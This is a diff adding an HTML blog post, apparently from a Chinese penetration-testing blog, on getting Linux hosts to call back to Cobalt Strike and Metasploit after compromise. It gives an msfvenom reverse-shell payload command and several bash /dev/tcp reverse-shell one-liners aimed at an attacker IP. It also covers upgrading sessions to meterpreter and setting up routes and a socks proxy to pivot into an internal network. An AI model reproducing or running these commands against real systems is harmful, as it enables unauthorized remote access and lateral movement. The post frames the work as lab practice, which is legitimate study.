@@ -1,0 +1,254 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Linux上线CS和MSF | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/7777/WEB.png')">
+            </div>
+          
+          <h2 class="post-title">Linux上线CS和MSF</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-11-11</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/msf/">
+                    MSF
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/linux/">
+                    linux
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/cobaltstrike/">
+                    CobaltStrike
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>渗透过程中遇到Windows环境比较多，习惯了上线CS和MSF进行操作。打靶场的时候拿到Linux权限后有点蒙，不知掉咋上线和添加代理了。这里记录一下常用的上线方式。</p>
+<!-- more -->
+<h3 id="0x01-cobalt-strike">0x01 Cobalt strike</h3>
+<p>很早就听说过<a href="https://github.com/gloxec/CrossC2">CrossC2</a>项目，具体安装方法可以参考<a href="https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh_full.md">官方文档</a>。根据项目说明，目前功能还不是很完善，不支持socks代理和TCP正向连接等功能。简易使用流程如下：</p>
+<blockquote>
+<p>1.建立一个C2的HTTPS的listener，<strong>（测试发现基于TCP的listener回连失败）</strong><br>
+2.生成恶意文件，将恶意文件上传至目标靶机运行上线<br>
+3.开启web服务，目标靶机远程下载恶意文件运行上线</p>
+</blockquote>
+<ol>
+<li><strong>恶意文件</strong><br>
+生成一个基于C2的HTTPS的listener，<strong>需提前建一个CS的监听</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/7777/c.png" alt="" loading="lazy"></li>
+</ol>
+<p>生成时有几点需要注意</p>
+<blockquote>
+<p>1.keys文件需要从CS服务端下载到本地，该文件隐藏看不见<br>
+2.Listener一栏选择提前建立的CS的监听<br>
+3.若点击build生成文件失败，需要给<strong>genCrossC2.MacOS</strong>文件执行权限</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/7777/WEb.png" alt="" loading="lazy"><br>
+之后将生成的out文件上传至目标机器执行即可<br>
+<img src="https://tuchuang.looklook.workers.dev/7777/bash.png" alt="" loading="lazy"></p>
+<ol start="2">
+<li><strong>利用Web Delivery</strong><br>
+和windows上线的方法是一样的，打开一个WEB服务，目标系统下载恶意文件并执行。<br>
+有几点需要注意</li>
+</ol>
+<blockquote>
+<p>1.需提前建一个C2的listener<br>
+2.Type根据目标系统选择</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/7777/web.png" alt="" loading="lazy"><br>
+之后在目标靶机上直接执行生成的代码即可上线<br>
+<img src="https://tuchuang.looklook.workers.dev/7777/WEB.png" alt="" loading="lazy"></p>
+<h3 id="0x02-msf">0x02 MSF</h3>
+<p>上线思路和CS一样，比较好的一点是在上线后能方便的添加内网路由和socks代理。</p>
+<ol>
+<li><strong>恶意文件</strong><br>
+首先利用msf生成木马文件，指定回连的VPS的IP和端口</li>
+</ol>
+<pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=4446 -f elf &gt; shell.elf
+</code></pre>
+<p>msf监听等待回连，将木马文件上传至目标靶机运行即可回连<br>
+<img src="https://tuchuang.looklook.workers.dev/7777/MSF.png" alt="" loading="lazy"></p>
+<ol start="2">
+<li><strong>bash反连</strong><br>
+首先还是建立监听等待回连</li>
+</ol>
+<pre><code>handler -H XX.XX.XX.XX -P 4447 -p  linux/x64/shell/reverse_tcp -n msf_linux_bash
+</code></pre>
+<p>之后在目标机器上执行如下命令即可，（任选一条）</p>
+<pre><code>echo 'bash -i &gt;&amp; /dev/tcp/192.168.88.88/4444 0&gt;&amp;1' | bash
+sh -i &gt;&amp; /dev/tcp/192.168.88.88/4444 0&gt;&amp;1
+bash -i &gt;&amp; /dev/tcp/192.168.88.88/4444 0&gt;&amp;1
+bash -c '0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/192.168.88.88/4444;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31'
+bash -c '0&lt;&amp;168-;exec 168&lt;&gt;/dev/tcp/192.168.88.88/4444;sh &lt;&amp;168 &gt;&amp;168 2&gt;&amp;168'
+bash -c '0&lt;&amp;168-;exec 168&lt;&gt;/dev/tcp/192.168.88.88/4444;bash &lt;&amp;168 &gt;&amp;168 2&gt;&amp;168'
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/7777/msf.png" alt="" loading="lazy"></figure>
+<p>这样获取的session其实就是目标靶机的bash。需要转换到meterpreter上才能进一步操作</p>
+<pre><code>use post/multi/manage/shell_to_meterpreter
+set lhost   192.168.88.88
+set lport   4448
+set session 2
+run
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/7777/reverse.png" alt="" loading="lazy"></figure>
+<h3 id="0x03-msf添加路由和代理">0x03 MSF添加路由和代理</h3>
+<p>很多情况下需要利用靶机做跳板将MSF带进内网进行扫描，这时就需要添加路由(去192.168.52网段的流量都会通过session 3进行代理)，这时就可以利用MSF进行C段扫描了。</p>
+<pre><code>route add 192.168.52.0/24 3
+route print
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://tuchuang.looklook.workers.dev/7777/route.png" alt="" loading="lazy"></figure>
+<p>此时，若其他工具也要进行代理，就需要添加socks。（可以看到能自己指定代理的端口和socks版本）</p>
+<pre><code>use auxiliary/server/socks_proxy
+set srvport 10006
+run
+</code></pre>
+<p><img src="https://tuchuang.looklook.workers.dev/7777/S-port.png" alt="" loading="lazy"><br>
+最后，在MSF上添加完Socks代理并正确配置本地proxychains之后，就能成功地将工具代理进入内网了<br>
+<img src="https://tuchuang.looklook.workers.dev/7777/socks.png" alt="" loading="lazy"></p>
+<h3 id="0x04-套上cdn的cs使用c2插件">0x04 套上CDN的CS使用C2插件</h3>
+<p><s>由于C2插件目前功能不完善，套上CDN后无法进行回连，占坑待填....</s></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/docker.html/">
+              <h3 class="post-title">
+                下一篇：Docker常用命令
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
